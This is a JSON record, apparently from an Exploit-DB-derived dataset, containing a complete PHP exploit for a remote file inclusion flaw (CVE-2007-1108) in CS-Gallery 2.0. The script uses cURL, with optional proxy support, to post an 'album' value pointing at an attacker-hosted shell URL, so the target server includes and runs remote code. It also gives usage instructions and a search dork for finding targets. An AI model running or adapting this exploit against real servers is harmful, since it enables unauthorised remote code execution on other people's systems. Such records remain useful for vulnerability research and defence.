{
  "id": "3372",
  "title": "CS-Gallery 2.0 - &#039;index.php?album&#039; Remote File Inclusion",
  "cve": "CVE-2007-1108",
  "vuln_type": "rce",
  "code": "<?php\r\n\r\n//File Inclusion Exploit for CS_Gallery <= 2.0\r\n//Found and Exploit Coded by burncycle - burncycle[(at)]robert-beran[(dot)]de\r\n//|\r\n//Vendor: http://www.cschneider.de/\r\n//Dork: www.cschneider.info\r\n//|\r\n//Bug in \"index.php\":\r\n//..\r\n//$codefile=$_POST['album'].'/code.php';\r\n//include $codefile;\r\n//..\r\n//|\r\n//Usage: php exploit.php [pathtoscript] [pathtoshell] ([proxy:port])\r\n//Example: php exploit.php http://pathtoscript.com/cs_gallery/ http://pathtoshell.com/shell.txt? (localhost:8118)\r\n//|\r\n//Your Box Needs the cURL extension of PHP\r\n//The exploit works only with allow_url_fopen = On and allow_url_include = On PHP settings on the target box\r\n//|\r\n//Edited 20.05.2007 by ensai (the same person as burncycle ;))\r\n//Added proxy support, working conditions supplemented and easier file inclusion statement\r\n\r\n//Nur ausnahme Fehler anzeigen\r\nerror_reporting(1);\r\n\r\necho \"Usage: php \".$_SERVER[\"argv\"][0].\" [pathtoscript] [pathtoshell] ([proxy:port])\\r\\n\\r\\n\";\r\necho \"Example: php \".$_SERVER[\"argv\"][0].\" http://pathtoscript.com/cs_gallery/ http://pathtoshell.com/shell.txt? (localhost:8118)\\r\\n\\r\\n\";\r\n\r\n//Schauen ob alles angegeben wurde\r\nif(!empty($_SERVER[\"argv\"][1]) && !empty($_SERVER[\"argv\"][2]))\r\n{\r\n\r\n  $pathtoscript = $_SERVER[\"argv\"][1];\r\n  $pathtoshell = $_SERVER[\"argv\"][2];\r\n\r\n  //erzeuge ein neues cURL Handle\r\n  $ch = curl_init();\r\n  \r\n  //proxy setzen\r\n  if (!empty($_SERVER['argv'][3]))\r\n  {\r\n    curl_setopt($ch, CURLOPT_PROXY, $_SERVER['argv'][3]);\r\n  }\r\n\r\n  //setzte die URL und andere Optionen\r\n  curl_setopt($ch, CURLOPT_URL, $pathtoscript.\"index.php?todo=securealbum\");\r\n  curl_setopt($ch, CURLOPT_HEADER, 0);\r\n  curl_setopt($ch, CURLOPT_POST, 1);\r\n  curl_setopt($ch, CURLOPT_POSTFIELDS, \"album=\".$pathtoshell);\r\n\r\n  //f?hre die Aktion aus\r\n  curl_exec($ch);\r\n\r\n  //schlie?e das Handle und gebe Systemresourcen frei\r\n  curl_close($ch);\r\n\r\n}\r\n\r\n?>\r\n\r\n# milw0rm.com [2007-02-24]",
  "url": "https://www.exploit-db.com/exploits/3372"
}